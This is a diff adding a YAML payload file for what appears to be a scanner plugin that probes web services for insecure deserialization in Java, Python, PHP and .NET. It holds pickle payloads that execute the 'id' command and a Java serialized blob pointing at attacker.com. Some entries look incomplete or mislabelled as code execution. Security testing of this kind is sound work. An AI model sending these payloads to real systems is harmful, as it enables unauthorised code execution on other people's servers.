@@ -1,0 +1,87 @@
+# Deserialization Payloads Database
+# Plugin: core.injection.deserialization
+
+plugin_id: core.injection.deserialization
+mutation_type: field_injection
+payload_type: deserialization
+
+variants:
+  # Variant 1: Java serialized (ysoserial-style)
+  - id: java_serialized
+    payloads:
+      - "rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcAUH2sHDFmDRAwACRgAKbG9hZEZhY3RvckkACXRocmVzaG9sZHhwP0AAAAAAAAx3CAAAABAAAAABc3IADGphdmEubmV0LlVSTJYlNzYa/ORyAwAHSQAIaGFzaENvZGVJAARwb3J0TAAJYXV0aG9yaXR5dAASTGphdmEvbGFuZy9TdHJpbmc7TAAEZmlsZXEAfgADTAAEaG9zdHEAfgADTAAIcHJvdG9jb2xxAH4AA0wAA3JlZnEAfgADeHD//////////3QAAHQAAHQAAHQABGh0dHBwdAAeaHR0cDovL2F0dGFja2VyLmNvbS9leHBsb2l0eA=="
+    tech_stack: [java]
+    confidence_boost: 0.30
+    detection: body_matches_any(ObjectInputStream, serialization, java.lang, uid=, exploited)
+    auto_variants:
+      encoding_chains:
+        - [url_encode]
+        - [base64]
+      obfuscation: []
+      max_combinations: 4
+
+  # Variant 2: Python pickle
+  - id: python_pickle
+    payloads:
+      - "cos\nsystem\n(S'id'\ntR."
+      - "c__builtin__\neval\n(S'__import__(\"os\").system(\"id\")'\ntR."
+    tech_stack: [python]
+    confidence_boost: 0.28
+    detection: body_matches_any(uid=, gid=, pickle, deserialization)
+    auto_variants:
+      encoding_chains:
+        - [url_encode]
+        - [base64]
+      obfuscation: []
+      max_combinations: 4
+
+  # Variant 3: PHP serialized
+  - id: php_serialized
+    payloads:
+      - 'O:8:"stdClass":1:{s:4:"test";s:3:"id";}'
+      - 'a:1:{i:0;O:4:"Test":1:{s:4:"cmd";s:2:"id";}}'
+    tech_stack: [php]
+    confidence_boost: 0.25
+    detection: body_matches_any(uid=, unserialize, Object)
+    auto_variants:
+      encoding_chains:
+        - [url_encode]
+      obfuscation: []
+      max_combinations: 4
+
+  # Variant 4: .NET BinaryFormatter
+  - id: dotnet_binary
+    payloads:
+      - "AAEAAAD/////AQAAAAAAAAAMAgAAAElTeXN0ZW0sIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5BQEAAAA="
+    tech_stack: [dotnet, csharp]
+    confidence_boost: 0.27
+    detection: body_matches_any(BinaryFormatter, deserialization, .NET)
+    auto_variants:
+      encoding_chains:
+        - [url_encode]
+      obfuscation: []
+      max_combinations: 2
+
+keywords:
+  - data
+  - payload
+  - serialized
+  - object
+  - content
+  - body
+  - session
+  - cookie
+
+expected_results:
+  java_serialized:
+    indicator: rce
+    expected_output: "uid="
+  python_pickle:
+    indicator: rce
+    expected_output: "uid="
+  php_serialized:
+    indicator: rce
+    expected_output: "uid="
+  dotnet_binary:
+    indicator: rce
+    expected_output: ""
